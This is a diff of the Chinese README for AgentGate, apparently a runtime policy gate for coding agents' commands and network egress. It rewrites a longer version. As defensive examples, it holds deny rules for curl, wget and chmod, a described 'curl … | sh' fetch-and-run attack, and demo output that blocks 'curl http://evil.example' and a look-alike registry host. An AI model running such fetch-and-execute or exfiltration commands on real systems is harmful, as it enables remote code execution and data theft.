@@ -1,289 +1,138 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="./assets/hero-dark.svg">
-    <source media="(prefers-color-scheme: light)" srcset="./assets/hero-light.svg">
-    <img src="./assets/hero-light.svg" width="880" alt="AgentGate — 给编码 Agent 的运行时主机沙箱">
-  </picture>
-</p>
+[English](./README.en.md) · [Website](https://agentgate.lei6393.com) · [GitHub](https://github.com/SuperMarioYL/agentgate)
 
-<p align="center">
-  <b>给编码 Agent 的运行时主机护栏——按每个动作授权它的安装、脚本与网络请求，而不是全有或全无。</b>
-</p>
+<picture>
+  <source media="(max-width: 600px) and (prefers-color-scheme: dark)" srcset="./assets/presentation/hero-mobile-dark.svg">
+  <source media="(max-width: 600px)" srcset="./assets/presentation/hero-mobile-light.svg">
+  <source media="(prefers-color-scheme: dark)" srcset="./assets/presentation/hero-dark.svg">
+  <img src="./assets/presentation/hero-light.svg" width="960" alt="Hero diagram">
+</picture>
 
-<p align="center">
-  <a href="./LICENSE"><img src="https://img.shields.io/badge/license-Apache--2.0-blue.svg" alt="License: Apache-2.0" /></a>
-  <a href="https://github.com/SuperMarioYL/agentgate/releases"><img src="https://img.shields.io/badge/release-v0.6.0-2563eb.svg" alt="Release" /></a>
-  <a href="https://github.com/SuperMarioYL/agentgate/actions"><img src="https://img.shields.io/github/actions/workflow/status/SuperMarioYL/agentgate/ci.yml?branch=main&label=CI" alt="CI" /></a>
-  <a href="https://go.dev/"><img src="https://img.shields.io/badge/Go-1.24%2B-00ADD8.svg?logo=go&logoColor=white" alt="Go" /></a>
-  <img src="https://img.shields.io/badge/platform-Linux%20%7C%20macOS-334155.svg" alt="Platform" />
-  <img src="https://img.shields.io/badge/Coding%20Agent-runtime%20gate-7c3aed.svg" alt="Coding Agent runtime gate" />
-</p>
+# AgentGate
 
-<p align="center">
-  <a href="./README.en.md">English</a> | <b>简体中文</b>
-</p>
+**在 Agent 动作执行前检查授权。**
 
----
-
-**你把 Agent 放进自主模式拉依赖、跑脚本——但容器是全有或全无的，关掉它换效率后，主机就彻底裸奔了。AgentGate 在每个触碰主机的动作发生的瞬间拦下来，带着 Agent 自己的意图问你一句：放行还是拒绝。**
-
-## 目录
-
-- [为什么需要它](#为什么需要它)
-- [快速开始](#快速开始)
-- [演示](#演示)
-- [policy.yaml 策略 DSL](#policyyaml-策略-dsl)
-- [配置项](#配置项)
-- [对比](#对比-vs-容器--静态扫描器)
-- [路线图](#路线图)
-- [许可证](#许可证)
+AgentGate 用命令 shim 与 HTTP(S) 代理包裹编码会话，按有序 YAML 策略裁决动作，并记录 JSONL 审计日志。
 
 ## 为什么需要它
 
-当你让一个编码 **Agent** 写代码、拉依赖、跑脚本时，你把信任交给了它，但责任还在你身上——而你和主机之间没有一个带作用域的检查点。容器能做隔离，可它是全有或全无的，开发者为了 Agent 的效率往往把它关掉；就算开着，它也无法区分「这次安装没问题」和「那个网络请求是在外传数据」。
+依赖安装与网络出口需要不同规则。策略可以在 npm install 前询问、放行包仓库并拒绝未声明主机；会话开始前可用 check 预览这些裁决。
 
-这不是一个静态依赖扫描器。Miasma 这类供应链蠕虫专门盯着 AI 编码 Agent——它瘫痪过 72+ 个仓库（含微软的 Azure Functions Action），而它的载荷只在安装 / 执行那一刻才暴露，静态分析在安装前读包根本看不到。AgentGate 是**运行时、按动作**的护栏：在安装、脚本、egress 发生的当下逐个授权，让供应链载荷在执行点被拦下，而不是等 72 个仓库挂掉后才发现。
+- **预览规则** — check 无需执行动作即可解释裁决。
+- **区分动作类型** — 命令与网络出口使用独立匹配规则。
+- **保留审计轨迹** — 运行时裁决可按动作、结果与时间过滤。
 
-> 这正是 [@simonw](https://twitter.com/simonw) 反复讨论的「Agent 跑 shell 命令时信任与控制的取舍」，也是那些把自主性拉满、却不带任何主机护栏的编码 Agent harness（如 [affaan-m/ECC](https://github.com/affaan-m/ECC)）缺的那一块——AgentGate 跟它们互补，而非竞争。
+## 架构
 
-## <img src="https://api.iconify.design/tabler:topology-star-3.svg?color=%232563eb&width=24" height="22" align="absmiddle" alt=""> 架构
+<picture>
+  <source media="(max-width: 600px) and (prefers-color-scheme: dark)" srcset="./assets/presentation/architecture-mobile-dark.svg">
+  <source media="(max-width: 600px)" srcset="./assets/presentation/architecture-mobile-light.svg">
+  <source media="(prefers-color-scheme: dark)" srcset="./assets/presentation/architecture-dark.svg">
+  <img src="./assets/presentation/architecture-light.svg" width="960" alt="Architecture diagram">
+</picture>
 
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="./assets/atlas-dark.svg">
-    <source media="(prefers-color-scheme: light)" srcset="./assets/atlas-light.svg">
-    <img src="./assets/atlas-light.svg" width="880" alt="架构：编码 Agent 拉起的子进程与网络 egress 被 PATH shim 和 HTTP(S) 代理拦下，转发给 unix-socket broker / Gate Engine，按 policy.yaml 逐个动作裁决并提示 allow/deny/always，结果写入 JSONL 审计日志——放行的动作才真正执行，拒绝的从不落地">
-  </picture>
-</p>
+已配置的 PATH shim 将截获命令交给 Unix socket broker；经过代理的流量进入同一 Gate Engine，按首条匹配规则决定，必要时询问操作者。审计模块记录运行时裁决；check 只对假设动作执行策略解析。
 
-编码 Agent 跑在护栏后面：它拉起的**已配置 shim 列表**（npm、pip、curl、wget、……）上的子进程被 **PATH shim** 截获——自定义二进制和直接 shell spawn 不受门控；通用 exec 插桩在路线图上——每个网络请求被注入的 **HTTP(S) 代理**重定向到本地。两条路径都汇到一个 **unix-socket broker / Gate Engine**，由它按 `policy.yaml` 做首条匹配即生效的裁决——必要时弹出 `[a]llow / [d]eny / [A]lways` 提示。放行的动作才 `exec` 真实二进制并继续，拒绝的从不落地；每一笔裁决都追加进 **JSONL 审计日志**，事后用 `agentgate audit` 回看。
-
-## 快速开始
-
-需要 Go 1.24+（Linux 或 macOS）。从冷启动到第一个授权提示，三条命令：
-
-```bash
-go install github.com/SuperMarioYL/agentgate@latest   # 1. 安装单文件二进制
-agentgate init                                         # 2. 在当前目录落一份默认 policy.yaml
-agentgate run -- claude --autonomous "加个图表库并接好"   # 3. 把你的 Agent 跑在护栏后面
-```
-
-第一个触碰主机的动作就会暂停，并显示 Agent 自己的意图：
-
-```
-┌─ AgentGate · action paused ──────────────────
-│ agent  : claude-code
-│ action : exec
-│ target : npm install chalk
-│ intent : agent wants to install npm package: chalk
-└──────────────────────────────────────────────
-  [a]llow / [d]eny / [A]lways ?
-```
-
-按 `a` 放行一次、`d` 拒绝、`A` 永久放行（会把规则写回 `policy.yaml`，稳态下几乎不再打扰你）。事后用 `agentgate audit` 查看每个被门控动作的 JSONL 审计流：
-
-```bash
-agentgate audit
-# ✓  13:20:26  exec        allow    npm install chalk
-# ✗  13:20:26  net_egress  deny     telemetry.unknown-host.example
-
-# 只看「被拦下了什么」——按决策 / 动作 / 时间过滤（v0.3.0）
-agentgate audit --decision deny
-agentgate audit --action net_egress --since 2h
-agentgate audit --decision deny --json   # 原始 JSONL，便于管道处理
-```
-
-> `--since` 接受 RFC3339 时间戳、日期（`2026-06-19`）或「多久之前」的时长（`2h`、`30m`）。
-
-> 拦截方式可移植、无需 ptrace / libpcap：通过 PATH shim 把每个被拦的命令转发给一个 unix-socket broker，由它持有门控决策；网络 egress 则通过注入 `HTTP(S)_PROXY` 的本地重定向代理逐个主机门控。完整走查见 [`examples/claude-code-session.md`](./examples/claude-code-session.md)。
-
-## <img src="https://api.iconify.design/tabler:photo.svg?color=%232563eb&width=24" height="22" align="absmiddle" alt=""> 演示
-
-Agent 的 `npm install` 被暂停等待批准，安装后脚本对未声明主机的 egress 被红字拦下，最后 `agentgate audit` 打出完整轨迹：
-
-![demo](assets/demo.gif)
-
-> 该 GIF 由 [`docs/demo.tape`](./docs/demo.tape) 经 [vhs](https://github.com/charmbracelet/vhs) 在 CI 中渲染（见 [`.github/workflows/demo.yml`](./.github/workflows/demo.yml)）。仓库另附录制好的 [`docs/demo.cast`](./docs/demo.cast)，可本地用 `asciinema play docs/demo.cast` 回放。
-
-## policy.yaml 策略 DSL
-
-策略是**有序、首条匹配即生效**的规则列表。每条规则有一个 `match`（`action` + `target_glob`）和一个 `decision`（`allow` / `deny` / `ask`）；任何规则都没命中的动作落到 `default`。
-
-```yaml
-default: ask                 # 没有规则命中时的兜底决策
-
-rules:
-  # exec —— Agent 拉起的安装与脚本
-  - match:
-      action: exec
-      target_glob: "*install*"
-    decision: ask            # 每次安装都浮现出来，让你看清拉了什么
-
-  # fs_write —— 仅 check / dry-run（本版尚未运行时强制，见下方安全说明）
-  - match:
-      action: fs_write
-      target_glob: "$PWD/**"
-    decision: allow
-    scope: "$PWD"            # 记录期望写入范围，供 agentgate check 解析
-
-  # net_egress —— 放行常用 registry，门控其余一切
-  - match:
-      action: net_egress
-      target_glob: "registry.npmjs.org"
-    decision: allow
-  - match:
-      action: net_egress
-    decision: deny           # 未声明的主机 -> 拦截
-```
-
-Glob 语义：`*` 匹配单个路径 / 主机段（`filepath.Match` 语义），`**` 跨段匹配（如 `$PWD/**`）；带后缀的 `**` 模式（如 `/proj/**.env`）要求 target 以该后缀**结尾**，不会把后缀当作中间子串去命中（即 `/proj/.env.backup/passwd` 不会被 `/proj/**.env` 误放）。不带通配的裸 host token 按**主机边界**匹配——命中整个 target，或 `host:port` 的 host 部分（如 `registry.npmjs.org` 命中 `registry.npmjs.org:443`），但**不会**误放 `github.com.evil.com` 或 `evilgithub.com` 这类伪造主机。以点开头的 token（如 `.github.com`）匹配整棵子域树（`api.github.com`），但不含裸顶级域 `github.com` 本身。`agentgate init` 会落一份内置的合理默认策略，可直接编辑。
-
-> ⚠️ **安全说明 —— 各动作面的强制现状（务必读）。** AgentGate 在运行时**强制**两个面：`exec`（Agent 拉起的子进程，经 PATH shim + broker 逐个裁决）与 `net_egress`（经本地 HTTP(S) 重定向代理按主机门控）。**`fs_write` 目前是 check / dry-run 专用**：策略引擎与 `agentgate check --action fs_write` 会解析写入规则，但本版**尚未**在运行时拦截 Agent 的真实写操作（运行时写入插桩 —— Linux ptrace/eBPF、macOS LD_PRELOAD/sandbox-exec —— 已列入 v0.7.0+ 路线图）。因此 `agentgate init` 的默认策略**不再**附带一条会让人误以为写入被真正拦下的兜底 `deny fs_write`。请用 `agentgate check` 验证写入规则，但**不要**指望它们在真实运行中生效——目前只有 `exec` 与 `net_egress` 是运行时强制的。
-
-### 先 dry-run 一下：`agentgate check`
-
-写完策略，想知道「Agent 真要做某个动作时会怎样」？`agentgate check` 把一个假想动作丢给策略，打印决策（`allow` / `deny` / `ask`）与命中原因——**不跑任何子进程、不发起任何 egress、不写审计日志**。
-
-```bash
-agentgate check --action exec -- npm install left-pad
-# action  : exec
-# target  : npm install left-pad
-# intent  : agent wants to install npm package: left-pad
-# decision: ask (matched a rule)
-
-agentgate check --action net_egress github.com.evil.com:443
-# decision: deny (no rule matched, fell through to default)
-
-agentgate check --action fs_write /etc/passwd
-# decision: deny (matched an allow rule but the path escapes its scope)
-```
-
-`--action` 取 `exec`（默认）/ `fs_write` / `net_egress`，`--policy` 指定要检查的策略文件。
-
-### 看清自己授权了什么：`agentgate policy`
-
-按了几次 `[A]lways` 之后，规则会悄悄写回 `policy.yaml`——一道运行时门控只有在你能看清它到底会放行什么时才值得信任。`agentgate policy` 按**首条匹配即生效**的顺序打印全部生效规则（含 `--always` 追加的那些）的动作、目标 glob、决策与 scope，最后一行是无规则命中时的默认决策：
-
-```bash
-agentgate policy
-# # effective policy (policy.yaml) — first match wins, top to bottom
-# #    ACTION      TARGET              DECISION  SCOPE
-# 1    net_egress  registry.npmjs.org  allow     -
-# 2    fs_write    /proj/**            allow     /proj
-# 3    exec        npm install*        allow     -
-# *    any         any                 ask       -
-```
-
-加 `--explain` 则只解析一个假想动作，告诉你它会命中哪条规则（复用与 `agentgate check` 相同的无副作用解析器）：
-
-```bash
-agentgate policy --explain --action exec "npm install chalk"
-# decision: allow (matched a rule)
-# matched : action=exec target=npm install* -> allow
-```
-
-### 撤销一条授权：`agentgate policy rm`
-
-看清规则只是一半——如果发现某个 `[A]lways` 授权得**太宽**，你还得能把它收回来。在 v0.5.0 之前，这意味着手动去改 `policy.yaml`；现在 `agentgate policy rm` 让「撤销一次错误授权」和「当初做出授权」一样简单。按上面列出的 **1 起始序号**删，或按 `--action` + `--target` 精确匹配删；被删的规则和更新后的生效表都会打印出来：
-
-```bash
-# 按序号删（就是 agentgate policy 打印的 # 列）
-agentgate policy rm 3
-# removed rule #3: action=exec target=npm install* -> allow
-# （随后重新打印生效规则表）
-
-# 或按 动作 + 目标 glob 精确匹配删
-agentgate policy rm --action net_egress --target "registry.npmjs.org"
-```
-
-序号越界、默认行（`*`）或匹配不到规则时，命令会给出清晰错误并以非零码退出，且**不改动**策略文件。删掉规则后，它此前自动放行的同类动作会重新回到提示/默认决策——授权是真正被收回了，不是只从表里消失。（本版只做**删除**：改写某条规则或调整顺序仍是删掉再加，或手动编辑 `policy.yaml`。）
-
-> v0.4.0 修复：早先 `[A]lways` 放行一条 exec 时，持久化的是**完整命令行原文**（如 `npm install left-pad`）。它不含通配，于是下一次 `npm install chalk` 命中不了、又来打扰你，`--always` 形同虚设。现在 exec 的 `[A]lways` 会按「二进制 + 子命令」生成可复用 glob（`npm install*`），既覆盖同类后续安装，又不会过宽到放行 `pip install`。
-
-## 供应链策略 cookbook
-
-从零写策略容易漏。[`examples/policies/supply-chain.yaml`](./examples/policies/supply-chain.yaml) 收录了针对**真实供应链攻击行为**的即用规则——每条都标注了它挡的是哪种攻击，且**全部 glob-正确**（不含 `|` 伪替代，见下）：
-
-| 配方 | 挡住的攻击 |
+| 组件 | 职责 |
 | --- | --- |
-| `deny exec *curl*` / `deny exec *wget*` | 装后脚本 `curl http://evil / wget … | sh` 拉远程载荷执行（RCE / 外泄） |
-| `ask exec *npm install*` / `*pip install*` | 每次依赖安装都浮现，看清拉了什么包（typosquat / 投毒） |
-| `deny net_egress` 兜底 + registry 白名单 | 载荷向未声明主机外泄数据 / 回连 C2 |
-| `deny exec *chmod +x*` 等 | 装后脚本给自己提权 / 落可执行文件 |
+| `Command shims` | internal/wrap/spawn.go |
+| `Socket broker + proxy` | internal/gate |
+| `Ordered policy` | internal/policy |
+| `Prompt + audit` | internal/prompt; internal/audit |
 
-复制其中一条到你的 `policy.yaml`，再用 `agentgate check` 确认它确实拦下对应命令：
+## 安装与快速上手
 
-```bash
-cp examples/policies/supply-chain.yaml policy.yaml     # 或把某几条粘进你现有的策略
-agentgate check --action exec -- curl http://evil.example
-# decision: deny (matched a rule)
-```
-
-> **为什么不能用 `*curl*|*sh*` 一条搞定？** glob 匹配器**没有** `|` 替代语义——`filepath.Match` 把 `|` 当**字面字符**。所以 `*curl*|*sh*` 只会命中「命令里恰好含 `curl … | … sh` 这段字面」的情况，`curl http://evil`（无字面竖线）和 `wget … | sh`（无 `curl`）都会**漏过**。cookbook 里一律拆成独立规则（`*curl*`、`*wget*` 各一条），别再把 `|` 当替代用。
-
-## 配置项
-
-`agentgate run` 的常用开关：
-
-| 选项 | 类型 | 默认值 | 含义 |
-| --- | --- | --- | --- |
-| `--policy` | string | `./policy.yaml`（或 `$AGENTGATE_POLICY`） | 使用的策略文件 |
-| `--audit` | string | `.agentgate/audit.jsonl`（或 `$AGENTGATE_AUDIT`） | 追加式 JSONL 审计日志路径 |
-| `--agent` | string | `claude-code` | 被包裹 Agent 的标识，会带进提示与审计 |
-| `--no-net` | bool | `false` | 关闭网络 egress 门控（仅门控 exec / fs） |
-| `--always` | bool | `true` | 把 `[A]lways` 选择持久化写回策略文件 |
-| `--enforce` | bool | `false` | 无人值守模式：不弹任何提示，每个 `ask` 直接 `deny`（默认拒绝），适配 CI |
-
-### 在 CI 里跑：`--enforce`
-
-CI 流水线里没有操作员可以回答提示。`agentgate run --enforce` 用空 prompter 启动引擎——每个 `ask` 直接落到 `deny`（默认拒绝），整个运行**永不等待 TTY**：
+使用仓库清单声明的运行时版本。以下源码安装步骤可复现随仓示例。
 
 ```bash
-agentgate run --enforce -- npm ci
-# agentgate: --enforce (headless): no prompts, ask resolves to deny (deny-by-default)
+git clone https://github.com/SuperMarioYL/agentgate.git
+cd agentgate
+go build ./cmd/agentgate
 ```
 
-只有被策略**显式 `allow`** 的动作才放行；其余一律拦下并落审计。该模式下 `--always` 持久化自动关闭（没有操作员可以选 `[A]lways`）。
+Python 脚本对完整供应链策略检查四个动作；Python 3 只用于示例驱动。
 
-## 对比 vs 容器 / 静态扫描器
-
-诚实的定位——容器在隔离上比我们成熟得多；AgentGate 解决的是另一个问题：**按动作、带意图、运行时**。
-
-| 维度 | AgentGate | 容器 / 一次性 VM | 静态依赖扫描器 |
-| --- | --- | --- | --- |
-| 按动作逐个授权 | ✓ | ✗（全有或全无） | ✗ |
-| 携带 Agent 意图 | ✓ | ✗ | ✗ |
-| 运行时拦截载荷 | ✓ | 部分（边界内不区分动作） | ✗（安装前读包，错过运行时载荷） |
-| 成熟的进程隔离 | 部分（spawn + egress 边界） | ✓ | — |
-| 安装时不被关掉换效率 | ✓ | ✗（常因影响效率被禁用） | — |
-
-## 路线图
-
-- [x] **m1 —— wrap & gate exec**：包裹 Agent，拦截已配置 shim 列表（npm、pip、curl、wget、……）上的子进程——自定义二进制和直接 shell spawn 不受门控；通用 exec 插桩在路线图上——带意图提示 allow/deny。
-- [x] **m2 —— scope fs & net**：`policy.yaml` 按主机门控 egress 并写入 JSONL 审计；`fs_write` 规则可由 `agentgate check` 解析（**check / dry-run 专用**，运行时强制见下方 v0.7.0+ 路线图）。
-- [x] **m3 —— DSL & 演示**：`allow`/`deny`/`ask` DSL + `--always` 持久化、`agentgate init` 默认策略、60 秒 asciinema 演示、双语 README。
-- [x] **m4 —— 写策略 & 审策略**：`agentgate check` 对任意动作做 dry-run；egress 按主机边界匹配，堵住伪造主机绕过；`.host` token 把规则限定在子域树内。
-- [x] **m5 —— CI 与排障**：`agentgate run --enforce` 无人值守默认拒绝模式（CI 不再卡在 TTY 提示）；`agentgate audit` 支持按 `--decision` / `--action` / `--since` 过滤与 `--json` 输出；修复符号链接越界写入与 `**` 路径 glob 子串过宽匹配两处沙箱缺陷。
-- [x] **m6 —— 看策略 & 可复用 always**：`agentgate policy` 按生效顺序打印全部规则（含 `--always` 追加项）+ `--explain` 解析单个动作；修复 exec 的 `[A]lways` 持久化命令行原文导致下一次同类安装仍被打扰的缺陷（改为「二进制 + 子命令」可复用 glob）。
-- [x] **m7 —— 撤策略（闭合 看→改 回路）**：`agentgate policy rm <序号>` / `--action --target` 从 CLI 撤销一条持久化规则，让收回一次过宽的 `[A]lways` 授权和当初做出它一样简单——不必再手改 `policy.yaml`。
-- [x] **m8 —— 供应链策略 cookbook + 安全实话**：附带 [`examples/policies/supply-chain.yaml`](./examples/policies/supply-chain.yaml)（针对真实供应链行为的即用 policy 配方，见下方 [Cookbook](#供应链策略-cookbook)）；同时修正四处安全表述/失效开放缺陷 —— `fs_write` 不再宣称运行时强制（改为 check/dry-run 专用）、broker 不可达时 shim **失败即拒**（不再 ungated 放行）、示例里失效的 `*curl*|*sh*` 规则改为 glob-正确的独立规则、net 代理绑定失败时**报错退出**（不再静默放行 egress）。
-- [ ] **运行时 fs_write 强制（v0.7.0+）**：Linux ptrace/eBPF、macOS LD_PRELOAD/sandbox-exec 写入插桩，让 `fs_write` 从 check-only 升级为真正的运行时拦截。
-- [ ] 更多 harness 的开箱适配与 README 安全章节集成（ECC / openfang，v0.7.0）。
-- [ ] 团队共享策略 / 审计仪表盘（v2+ 探索，非当前论点）。
-
-> 推送仓库后可设置 GitHub topics：`gh repo edit --add-topic agent --add-topic coding-agent --add-topic security --add-topic sandbox`
-
-## 许可证
-
-AgentGate 免费、MIT 许可、单文件二进制的开源软件——没有付费墙，没有托管层。欢迎通过 [issue](https://github.com/SuperMarioYL/agentgate/issues) 反馈问题或提交 PR。
-
-## Share this
-
-```
-AgentGate — a runtime per-action host gate for your Coding Agent. It pauses each
-install / script / egress with the agent's own intent, instead of all-or-nothing
-containers. After the Miasma worm, your agent needs a seatbelt.
-https://github.com/SuperMarioYL/agentgate
+```bash
+python3 examples/presentation_demo.py
 ```
 
-<p align="center"><sub><a href="./LICENSE">MIT</a> © 2026 SuperMarioYL</sub></p>
+## 实际运行示例
+
+<picture>
+  <source media="(max-width: 600px) and (prefers-color-scheme: dark)" srcset="./assets/presentation/process-mobile-dark.svg">
+  <source media="(max-width: 600px)" srcset="./assets/presentation/process-mobile-light.svg">
+  <source media="(prefers-color-scheme: dark)" srcset="./assets/presentation/process-dark.svg">
+  <img src="./assets/presentation/process-light.svg" width="960" alt="Process diagram">
+</picture>
+
+curl is denied; npm install asks; the registry is allowed; its look-alike hostname is denied.
+
+```text
+action  : exec
+target  : curl http://evil.example
+intent  : agent wants to fetch a URL via curl: http://evil.example
+decision: deny (matched a rule)
+action  : exec
+target  : npm install left-pad
+intent  : agent wants to install npm package: left-pad
+decision: ask (matched a rule)
+action  : net_egress
+target  : registry.npmjs.org:443
+intent  : agent wants to reach registry.npmjs.org:443
+decision: allow (matched a rule)
+action  : net_egress
+target  : registry.npmjs.org.evil.example:443
+intent  : agent wants to reach registry.npmjs.org.evil.example:443
+decision: deny (matched a rule)
+```
+
+完整命令与输出保存在 [docs/demo-results.json](./docs/demo-results.json). 输入和复现代码均随仓提供。
+
+![已有终端录制](./assets/demo.gif)
+
+保留已有录制供参考；上方文字示例给出当前可复现的操作。
+
+## 用法
+
+安装后在仓库根目录运行以下命令；处理自己的数据时替换相应路径。
+
+```bash
+go run ./cmd/agentgate init
+go run ./cmd/agentgate policy --policy examples/policies/supply-chain.yaml
+go run ./cmd/agentgate policy --policy examples/policies/supply-chain.yaml --explain --action exec "npm install chalk"
+go run ./cmd/agentgate audit --decision deny --json
+```
+
+## 配置
+
+--policy 或 AGENTGATE_POLICY 指定策略，--audit 或 AGENTGATE_AUDIT 指定日志。--enforce 在无终端时把 ask 判为 deny；--no-net 关闭网络代理门控。规则使用 filepath 风格 glob，不是正则，也不支持 | 或运算。裸主机名按主机边界匹配；.github.com 表示子域，不含顶级域。用 policy rm 撤销已保存规则前应检查规则顺序。
+
+## 集成与职责分工
+
+<picture>
+  <source media="(max-width: 600px) and (prefers-color-scheme: dark)" srcset="./assets/presentation/integrations-mobile-dark.svg">
+  <source media="(max-width: 600px)" srcset="./assets/presentation/integrations-mobile-light.svg">
+  <source media="(prefers-color-scheme: dark)" srcset="./assets/presentation/integrations-dark.svg">
+  <img src="./assets/presentation/integrations-light.svg" width="960" alt="Integrations diagram">
+</picture>
+
+根据工作流选择输入与输出路径。本文本地示例验证其中明确说明的子流程。
+
+| 路径 | 已实现职责 |
+| --- | --- |
+| YAML policy | First match wins; allow / deny / ask |
+| Configured executables | PATH shim interception |
+| HTTP(S) proxy | Host-based egress decisions |
+| JSONL | Runtime audit and filters |
+| check / policy | Dry-run explanation and rule management |
+
+## 限制与后续方向
+
+- 这不是完整主机沙箱。自定义二进制、直接 shell spawn 与绕过代理的流量不在这些截获路径内。
+- fs_write 规则仅支持 check，尚未实现运行时文件写入截获。
+- 示例仅裁决假设动作，不验证进程隔离或实时网络拦截。
+
+运行时文件写入插桩、更多框架适配与团队共享策略仍是后续方向；随仓供应链 cookbook 展示当前匹配器的用法。
+
+## 许可与贡献
+
+许可见 [LICENSE](./LICENSE). 反馈问题时请提供最小输入、执行命令和实际输出。
